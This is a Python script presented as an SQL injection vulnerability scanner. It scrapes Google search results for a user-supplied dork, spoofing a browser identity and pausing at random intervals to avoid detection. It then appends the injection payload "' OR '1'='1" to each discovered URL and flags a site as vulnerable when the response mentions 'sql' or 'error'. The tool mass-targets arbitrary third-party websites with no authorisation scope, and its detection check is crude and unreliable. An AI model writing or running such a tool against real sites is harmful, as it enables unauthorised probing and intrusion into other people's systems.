import requests
from bs4 import BeautifulSoup
import curses
import time
import random

#Search using Dork SQL
def google_search(dork, num_pages=1):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
    }
    urls = []
    for page in range(num_pages):
        try:
            url = f"https://www.google.com/search?q={dork}&start={page * 10}"
            response = requests.get(url, headers=headers, timeout=10)
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, "html.parser")
                results = soup.find_all("a")
                for result in results:
                    href = result.get("href")
                    if href and "url?q=" in href:
                        extracted_url = href.split("url?q=")[1].split("&")[0]
                        if "http" in extracted_url:
                            urls.append(extracted_url)
                time.sleep(random.uniform(2, 5))
            else:
                break
        except Exception as e:
            break
    return list(set(urls))

# Testing sites to see if they are vulnerable SQL Injection
def test_sql_injection(url):
    payload = "' OR '1'='1"  # Simple payload for vulnerability testing
    try:
        if "=" in url:
            test_url = url + payload
            response = requests.get(test_url, timeout=10)
            if "sql" in response.text.lower() or "error" in response.text.lower():
                return True
    except:
        pass
    return False

#Display results in interface curses
def main(stdscr):
    curses.curs_set(0)
    stdscr.clear()
    
    stdscr.addstr(0, 0, "SQL Injection Vulnerability Scanner - Developed by Melek Saidani", curses.A_BOLD)
    stdscr.addstr(2, 0, "Enter SQL Dork: ")
    curses.echo()
    dork = stdscr.getstr(3, 0).decode("utf-8").strip()
    
    stdscr.addstr(4, 0, "Enter number of pages to search: ")
    num_pages = int(stdscr.getstr(5, 0).decode("utf-8").strip())
    curses.noecho()
    
    stdscr.addstr(7, 0, f"[*] Searching for dork: {dork}")
    stdscr.refresh()
    urls = google_search(dork, num_pages)
    
    if not urls:
        stdscr.addstr(8, 0, "[-] No sites found.")
        stdscr.refresh()
        time.sleep(2)
        return

    stdscr.addstr(8, 0, f"[*] Found {len(urls)} sites. Testing for SQL Injection...")
    stdscr.refresh()
    y = 9
    
    for url in urls:
        vulnerable = test_sql_injection(url)
        if vulnerable:
            stdscr.addstr(y, 0, f"[+] Vulnerable: {url}", curses.color_pair(1))
        else:
            stdscr.addstr(y, 0, f"[-] Not Vulnerable: {url}", curses.color_pair(2))
        y += 1
        stdscr.refresh()
        time.sleep(0.5)

    stdscr.addstr(y + 2, 0, "[*] Scan completed. Press any key to exit.")
    stdscr.refresh()
    stdscr.getch()


if __name__ == "__main__":
    curses.wrapper(main)
